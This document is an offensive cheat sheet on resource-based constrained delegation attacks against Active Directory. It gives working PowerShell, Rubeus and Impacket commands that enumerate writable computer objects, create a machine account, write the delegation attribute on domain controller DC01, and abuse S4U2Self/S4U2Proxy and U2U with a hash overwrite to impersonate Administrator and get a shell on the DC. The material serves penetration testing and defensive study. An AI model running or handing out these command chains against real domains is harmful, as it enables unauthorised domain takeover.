### Content

- [Enumeration](#enumeration)
- [From Windows](#from-windows)
	- [ms-DS-MachineAccountQuota = 10](#ms-ds-machineaccountquota-=-10)
		- [Clean Up](#clean-up)
	- [ms-DS-MachineAccountQuota = 0](#ms-ds-machineaccountquota-=-0)
- [From Linux](#from-linux)
	- [ms-DS-MachineAccountQuota = 10](#ms-ds-machineaccountquota-=-10)
	- [ms-DS-MachineAccountQuota = 0](#ms-ds-machineaccountquota-=-0)

---

> [!Important]
> 
> If the `impersonated` account is [is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts) or a member of the [Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) group, the delegation will fail.
> 
> For RID 500, "Administrator" you need to tick the option “Account is sensitive and cannot be delegated” in the account settings even if the RID500 account is in Protected Users. (source: [sensepost](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/))
> 
> [The hacker Recipes is the greatest resource](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users)


<img src="/assets/resource_based_constrained_delegation_cheat_sheet.png" style="display: block; margin:auto; width:60%; height:60%;">




---
### Enumeration

From a Windows host:

```PowerShell
### Write the following lines in SearchRBCD.ps1 then run it .\SearchRBCD.ps1
# Used to discover which user has write privilege over the attribute msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object
# PowerView
Import-Module PowerView.ps1
# get all computers in the domain
$computers = Get-DomainComputer
# get all users in the domain
$users = Get-DomainUser
# define the required access rights
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
# loop through each computer in the domain
foreach ($computer in $computers) {
    # get the security descriptor for the computer
    $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs

    # loop through each user in the domain
    foreach ($user in $users) {
        # check if the user has the required access rights on the computer object
        $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}

        if ($hasAccess) {
            Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
        }
    }
}

	

# Find computers with RBCD configured
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null }
```

From a Linux host:

```bash
rbcd.py -dc-ip <IP> -delegate-to DC01$ -action 'read' corp.local/<USER>:<PASSWORD>

findDelegation.py CORP.LOCAL/<USER>:<PASSWORD>
```

---

The scenario:

1. The environment has a domain controller `DC01`
2. The attacker compromised user `CORP\normalUser`, which he used to enumerate the domain
3. The attacker also compromised user `CORP\carole` that has privileges to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on the `DC01`. Which indicate that `carole` has `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` privileges over the `DC01` machine.
4. If `ms-DS-MachineAccountQuota` attribute is set to 10 which is the default for authenticated users:
	1. The attacker will use the compromised user account `CORP\normalUser` to create a machine account `CORP\newMachine$`
	2. Using the compromised account `CORP\carole`, the attacker will add the `CORP\newMachine$`'s security descriptor to the `CORP\DC01$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute by:
		1. Obtaining the computer SID.
		2. Using the [Security Descriptor Definition Language (SDDL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) to create a security descriptor.
		3. Convert that security descriptor to its binary format.
		4. Modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on target computer `DC01`.
	3. Using the created machine account `CORP\newMachine$`, the attacker will initiate a `S4U2Self` & `S4U2Proxy` to impersonate the administrator to access the `CORP\DC01$`
5. If `ms-DS-MachineAccountQuota` attribute is set to 0 by the administrator:
	1. Using `CORP\normalUser` itself as the delegation principal, relying on the User-to-User (U2U) Kerberos extension to bypass the SPN requirement.
	2. Use the compromised account `CORP\carole`, the attacker will add `CORP\normalUser`'s security descriptor to `CORP\DC01$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
	3. Obtain a TGT for `CORP\normalUser` using its NT hash, forcing RC4 as the session key encryption type. Because RC4-HMAC produces a 16-byte MD4 digest as the session key,  which is structurally identical to an NT hash.
	4. Extract the TGT session key from the obtained TGT.
	5. Perform a `S4U2Self` request using the `U2U` extension, supplying the TGT in both the authenticator and the `U2U` session key hint fields. The KDC encrypts the resulting TGS with the TGT's own RC4 session key instead of a long-term service key, bypassing the SPN lookup entirely.
	6. Attempting `S4U2Proxy` with this U2U TGS will fail with `KDC_ERR_BADOPTION` because the KDC tries to decrypt the submitted TGS using `CORP\normalUser`'s current long-term NT hash, which does not match the RC4 session key that was used to encrypt the U2U TGS.
		1. To bridge this mismatch, the attacker will need to overwrite `CORP\normalUser`'s NT hash with the extracted TGT session key using the `SamrChangePasswordUser` method (MS-SAMR). After this operation, `CORP\normalUser`'s NT hash is identical to the TGT session key used to encrypt the U2U TGS.
		2. The attacker will re-submit the `S4U2Proxy` request, supplying the original TGT and the U2U TGS from step 5-6. The KDC now successfully decrypts the U2U TGS using `CORP\normalUser`'s updated NT hash (which equals the session key), validates the PAC signatures, and issues a forwardable service ticket for the target SPN on `CORP\DC01$` impersonating the administrator.

### From Windows
#### ms-DS-MachineAccountQuota = 10

Step 1: Creating a computer account can be done by using [PowerMad](https://github.com/Kevin-Robertson/Powermad) script:

```PowerShell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount newMachine -Password $(ConvertTo-SecureString "Password123@" -AsPlainText -Force)
```

Step 2 / Option 1: Editing  `msDS-AllowedToActOnBehalfOfOtherIdentity` using PowerView

```PowerShell
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer newMachine -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "CORP\carole", (ConvertTo-SecureString "P4ssw0rd123@" -AsPlainText -Force)
Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
```

Step 2 / Option 2: Editing  `msDS-AllowedToActOnBehalfOfOtherIdentity` using ActiveDirectory module

```PowerShell
$credentials = New-Object System.Management.Automation.PSCredential "CORP\carole", (ConvertTo-SecureString "P4ssw0rd123@" -AsPlainText -Force)

Set-ADComputer DC01 -PrincipalsAllowedToDelegateToAccount newMachine$ -Credential $credentials
```

Step 3: Using the created machine account `CORP\newMachine$`, to perform `S4U2Self` then `S4U2Proxy` to impersonate the administrator to access the `CORP\DC01$`

```PowerShell
# Get the created computer hash using Rubeus
.\Rubeus.exe hash /password:Password123@ /user:newMachine$ /domain:corp.local

# Performing S4U2Self then S4U2Proxy
# to request a TGS ticket for the service cifs/DC01.corp.local as the Administrator
.\Rubeus.exe s4u /user:newMachine$ /rc4:<newMachineNTLM> /impersonateuser:Administrator /msdsspn:cifs/DC01.corp.local /ptt
# then we can lunch commands such: ls \\DC01.corp.local\c$\
```

> `/altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm` to add services to our ticket request.

##### Clean Up

```PowerShell
# Using the account that has write privileges over the DC to clean up
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $credentials = New-Object System.Management.Automation.PSCredential "CORP\carole", (ConvertTo-SecureString "P4ssw0rd123@" -AsPlainText -Force)
PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose
```

#### ms-DS-MachineAccountQuota = 0

Read the [article](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) , then follow the instructions [here](https://github.com/GhostPack/Rubeus/pull/137) or see this :}

> You must have privileges to change the password of the controlled user

```PowerShell
# Adding the controlled user security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity attribute in the DC01
$credentials = New-Object System.Management.Automation.PSCredential "CORP\carole", (ConvertTo-SecureString "P4ssw0rd123@" -AsPlainText -Force)
Set-ADComputer DC01 -PrincipalsAllowedToDelegateToAccount normalUser -Credential $credentials

# Request a TGT for the normalUser
.\Rubeus.exe asktgt /user:normalUser /rc4:<NT> /nowrap
# We can get the rc4
.\Rubeus.exe hash /user:normalUser /password:pass /domain:corp.local

# Request a U2U ticket providing TGT within the /ticket and /tgs options and specifying the user to impersonate within the /targetuser option (an S4U2self-U2u extention request):
.\Rubeus.exe asktgs /u2u /targetuser:Administrator /nowrap /ticket:<TGT> /tgs:<TGT>
```

On the attacker linux machine:

```bash
# Decode the base64 key outputed from rubues above
python3 -c 'import binascii, base64; print(binascii.hexlify(base64.b64decode("<TGT_SESSION_KEY_B64>")).decode());'

# Set the account NT hash to the hash you got above
changepasswd.py corp.local/normalUser:pass@dc01.corp.local -newhashes :<NT>
```

On the windows machine:

```PowerShell
# Go for the S4U attack providing the initial TGT within the /ticket option and the forwardable TGS (got from the U2U request) within the /tgs option (an S4U2proxy request):
.\Rubeus.exe s4u /msdsspn:cifs/SRV01.corp.local /ticket:<TGT> /tgs:<TGS>
```

### From Linux
#### ms-DS-MachineAccountQuota = 10

```bash
# Create a fake computer newMachine
addcomputer.py -computer-name 'newMachine$' -computer-pass Password123@ -dc-ip <IP> corp.local/carole

# Edit DC01 msDS-AllowedToActOnBehalfOfOtherIdentity to include newMachine security descriptor
rbcd.py -dc-ip <IP> -delegate-to DC01 -delegate-from newMachine -action 'write<or>read' corp\\carole:<PASSWORD>

# Ask for a TGT for the created computer account, followed by a S4U2Self request to get a forwardable TGS ticket, and then a S4U2Proxy request to get a valid TGS ticket for a specific SPN on the targeted computer.
getST.py -spn cifs/DC01.corp.local -impersonate Administrator -dc-ip <IP> corp.local/newMachine:Password123@

# Access the DC as the Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.corp.local
```

#### ms-DS-MachineAccountQuota = 0

```bash
# Convert the user into NT hash
pypykatz crypto nt 'pass'

# Retriev a TGT
getTGT.py CORP.LOCAL/normalUser -hashes :NT -dc-ip <IP>

# Obtain the ticket session key
describeTicket.py normalUser.ccache | grep 'Ticket Session Key'

# Reset controlled user password
changepasswd.py CORP.LOCAL/normalUser@dc01.corp.local -hashes :<OLD_NT> -newhash :<SESSION_KEY>

# Request a service ticket
KRB5CCNAME=normalUser.ccache
getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.CORP.LOCAL -no-pass CORP.LOCAL/normalUser -dc-ip <IP>

# Access the DC using as the Administrator
KRB5CCNAME=Administrator@TERMSRV_DC01.CORP.LOCAL@CORP.LOCAL.ccache
wmiexec.py DC01.CORP.LOCAL -k -no-pass
```

